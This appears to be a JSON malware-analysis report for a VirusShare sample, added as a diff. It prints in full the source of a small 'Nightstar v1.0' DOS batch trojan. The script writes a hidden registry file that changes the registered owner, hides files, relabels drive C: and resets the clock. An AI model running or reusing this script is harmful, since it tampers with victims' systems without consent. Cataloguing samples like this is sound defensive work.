@@ -1,0 +1,54 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "@echo off\nif errorlevel 1 goto fresh_blood1\necho \"Every one sleeps, except Nightstar, he\ufffds looking\necho for victims...\"\n:fresh_blood1\nif exist C:\\Windows goto payloadia\nif not exist %0.bat goto fresh_blood2\nfind \"Windows\"<%0.bat\">C:\\Windows\nattrib C:\\Windows +h\n:fresh_blood2\nECHO [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion]>>%windir%\\blood.reg\nECHO \"RegisteredOwner\"=\"Nightstar v1.0\">>%windir%\\blood.reg\nECHO \"RegisteredOrganization\"=\"By OnNiacine\ufffd\">>%windir%\\blood.reg\nattrib C:\\Windows\\blood.reg +h\nlabel C: xxxxxxxxxxx\n:payloadia\ntime 00.00"
+    },
+    "filename": "VirusShare_0bb30528847605b58b599a1af0f81e78",
+    "filesize": 581,
+    "filetype": "DOS batch file, ISO-8859 text, with CRLF line terminators",
+    "hashes": {
+        "md5": "0bb30528847605b58b599a1af0f81e78",
+        "sha1": "67afb0889129921335663da1b8f46fc081b0d1bb",
+        "sha256": "f1b8cf67983aa6f83e5e70b470cd0f0009d9f141036fb1744d8eff0a066a5204"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "if errorlevel 1 goto fresh_blood1",
+            "echo \"Every one sleeps, except Nightstar, hes looking",
+            "echo for victims...\"",
+            ":fresh_blood1",
+            "if exist C:\\Windows goto payloadia",
+            "if not exist %0.bat goto fresh_blood2",
+            "find \"Windows\"<%0.bat\">C:\\Windows",
+            "attrib C:\\Windows +h",
+            ":fresh_blood2",
+            "ECHO [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion]>>%windir%\\blood.reg",
+            "ECHO \"RegisteredOwner\"=\"Nightstar v1.0\">>%windir%\\blood.reg",
+            "ECHO \"RegisteredOrganization\"=\"By OnNiacine\">>%windir%\\blood.reg",
+            "attrib C:\\Windows\\blood.reg +h",
+            "label C: xxxxxxxxxxx",
+            ":payloadia",
+            "time 00.00"
+        ],
+        "file": {
+            "ECHO \"RegisteredOrganization\"=\"By OnNiacine\">>%windir%\\blood.reg": "Registry",
+            "ECHO \"RegisteredOwner\"=\"Nightstar v1.0\">>%windir%\\blood.reg": "Registry",
+            "ECHO [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion]>>%windir%\\blood.reg": "Registry"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.274510",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
